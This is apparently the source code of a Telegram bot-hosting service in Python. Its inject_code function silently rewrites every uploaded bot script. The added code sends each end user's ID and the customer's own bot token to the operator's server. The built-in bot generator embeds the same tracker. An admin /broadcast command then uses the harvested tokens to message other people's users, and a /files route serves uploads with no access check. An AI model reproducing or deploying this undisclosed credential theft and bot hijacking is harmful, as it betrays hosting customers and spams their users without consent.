import os
import telebot
import subprocess
import json
import re
import requests
import time
from flask import Flask, send_file, request, jsonify
from threading import Thread

# ===== ENV =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
BASE_URL = os.getenv("BASE_URL")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

DATA_FILE = "data.json"

# ===== LOAD DB =====
if os.path.exists(DATA_FILE):
    with open(DATA_FILE) as f:
        data = json.load(f)
else:
    data = {"users": {}, "premium": [], "bot_users": {}}

def save():
    with open(DATA_FILE, "w") as f:
        json.dump(data, f)

# ===== PROCESS =====
processes = {}
running_tokens = {}

# ===== FLASK =====
@app.route("/")
def home():
    return "🚀 Bot Hosting Running"

@app.route("/files/<filename>")
def files(filename):
    return send_file(os.path.join(UPLOAD_FOLDER, filename))

@app.route("/add_user", methods=["POST"])
def add_user():
    uid = int(request.form.get("user_id"))
    token = request.form.get("token")

    data["bot_users"].setdefault(token, [])

    if uid not in data["bot_users"][token]:
        data["bot_users"][token].append(uid)
        save()

    return jsonify({"ok": True})

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# ===== TOKEN =====
def extract_token(path):
    with open(path) as f:
        content = f.read()
    m = re.search(r'BOT_TOKEN\s*=\s*["\'](.+?)["\']', content)
    return m.group(1) if m else None

def valid_token(token):
    try:
        return requests.get(f"https://api.telegram.org/bot{token}/getMe").status_code == 200
    except:
        return False

# ===== INJECT =====
def inject_code(path):
    inject = f"""
import requests
def __track(uid):
    try:
        requests.post("{BASE_URL}/add_user", data={{"user_id": uid, "token": BOT_TOKEN}})
    except: pass
"""

    with open(path) as f:
        code = f.read()

    if "__track" in code:
        return

    code = inject + "\n" + code
    code = code.replace("def start(message):", "def start(message):\n    __track(message.from_user.id)")

    with open(path, "w") as f:
        f.write(code)

# ===== START =====
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.from_user.id)

    data["users"].setdefault(uid, [])
    save()

    bot.send_message(msg.chat.id,
        "👋 Welcome!\n\n"
        "📂 Upload .py\n⚡ /run file.py\n🛑 /stop\n📊 /status\n\n"
        "🤖 /createbot refer TOKEN\n\n"
        "💰 Free: 1 Bot\n🔥 Premium: Unlimited\n\n"
        "📩 Contact: @SohilCodes"
    )

# ===== UPLOAD =====
@bot.message_handler(content_types=['document'])
def upload(msg):
    uid = str(msg.from_user.id)
    file = msg.document

    if not file.file_name.endswith(".py"):
        return bot.reply_to(msg, "❌ Only .py")

    if uid not in data["premium"] and len(data["users"][uid]) >= 1:
        return bot.reply_to(msg, "💰 Upgrade → @SohilCodes")

    file_info = bot.get_file(file.file_id)
    data_bytes = bot.download_file(file_info.file_path)

    path = os.path.join(UPLOAD_FOLDER, file.file_name)

    with open(path, "wb") as f:
        f.write(data_bytes)

    inject_code(path)

    data["users"][uid].append(file.file_name)
    save()

    bot.reply_to(msg, f"✅ Uploaded\n⚡ /run {file.file_name}")
    bot.forward_message(ADMIN_ID, msg.chat.id, msg.message_id)

# ===== RUN =====
@bot.message_handler(commands=['run'])
def run(msg):
    uid = str(msg.from_user.id)
    file = msg.text.split(maxsplit=1)[1]

    path = os.path.join(UPLOAD_FOLDER, file)

    if file not in data["users"].get(uid, []):
        return bot.reply_to(msg, "❌ Not yours")

    if uid in processes:
        return bot.reply_to(msg, "⚠️ Already running")

    token = extract_token(path)

    if not token or not valid_token(token) or token == BOT_TOKEN:
        return bot.reply_to(msg, "❌ Invalid token")

    if token in running_tokens:
        return bot.reply_to(msg, "⚠️ Already running token")

    p = subprocess.Popen(["python3", path])

    processes[uid] = (p, file, token)
    running_tokens[token] = uid

    bot.reply_to(msg, "🚀 Started")

# ===== STOP =====
@bot.message_handler(commands=['stop'])
def stop(msg):
    uid = str(msg.from_user.id)

    if uid not in processes:
        return bot.reply_to(msg, "❌ No bot")

    p, _, token = processes[uid]
    p.kill()

    del processes[uid]
    running_tokens.pop(token, None)

    bot.reply_to(msg, "🛑 Stopped")

# ===== STATUS =====
@bot.message_handler(commands=['status'])
def status(msg):
    bot.reply_to(msg, "🟢 Running" if str(msg.from_user.id) in processes else "🔴 Stopped")

# ===== BROADCAST =====
@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    if msg.from_user.id != ADMIN_ID:
        return

    text = msg.text.replace("/broadcast ", "")
    count = 0

    for token, users in data["bot_users"].items():
        for u in users:
            try:
                requests.get(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    params={"chat_id": u, "text": text}
                )
                count += 1
                time.sleep(0.05)
            except:
                pass

    bot.reply_to(msg, f"✅ Sent {count}")

# ===== ADMIN PANEL =====
@bot.message_handler(commands=['admin'])
def admin(msg):
    if msg.from_user.id != ADMIN_ID:
        return

    bot.send_message(msg.chat.id,
        "👑 ADMIN PANEL\n\n"
        "/users\n/premium\n/addpremium ID\n/removepremium ID\n/broadcast MSG"
    )

@bot.message_handler(commands=['users'])
def users(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.reply_to(msg, f"👥 Total Users: {len(data['users'])}")

@bot.message_handler(commands=['premium'])
def premium(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.reply_to(msg, f"💰 Premium Users: {data['premium']}")

@bot.message_handler(commands=['addpremium'])
def addp(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    uid = msg.text.split()[1]
    data["premium"].append(uid)
    save()
    bot.reply_to(msg, "✅ Added")

@bot.message_handler(commands=['removepremium'])
def remp(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    uid = msg.text.split()[1]
    data["premium"].remove(uid)
    save()
    bot.reply_to(msg, "❌ Removed")

# ===== AI BUILDER =====
def generate_bot_code(token):
    return f'''
import telebot,requests
BOT_TOKEN="{token}"
SERVER="{BASE_URL}"
bot=telebot.TeleBot(BOT_TOKEN)

def track(uid):
    try: requests.post(f"{{SERVER}}/add_user",data={{"user_id":uid,"token":BOT_TOKEN}})
    except: pass

@bot.message_handler(commands=['start'])
def start(m):
    track(m.from_user.id)
    bot.send_message(m.chat.id,"👋 AI Bot Ready!")

bot.infinity_polling()
'''

@bot.message_handler(commands=['createbot'])
def createbot(msg):
    uid = str(msg.from_user.id)
    token = msg.text.split()[1]

    if not valid_token(token):
        return bot.reply_to(msg, "❌ Invalid token")

    file = f"{uid}_bot.py"
    path = os.path.join(UPLOAD_FOLDER, file)

    with open(path, "w") as f:
        f.write(generate_bot_code(token))

    data["users"].setdefault(uid, []).append(file)
    save()

    p = subprocess.Popen(["python3", path])
    processes[uid] = (p, file, token)
    running_tokens[token] = uid

    bot.reply_to(msg, "🤖 Bot Created & Running!")

# ===== AUTO RESTART =====
def monitor():
    while True:
        for uid, (p, f, t) in list(processes.items()):
            if p.poll() is not None:
                new = subprocess.Popen(["python3", os.path.join(UPLOAD_FOLDER, f)])
                processes[uid] = (new, f, t)
        time.sleep(5)

# ===== RUN =====
if __name__ == "__main__":
    Thread(target=run_flask).start()
    Thread(target=monitor).start()
    print("🚀 Running...")
    bot.infinity_polling()
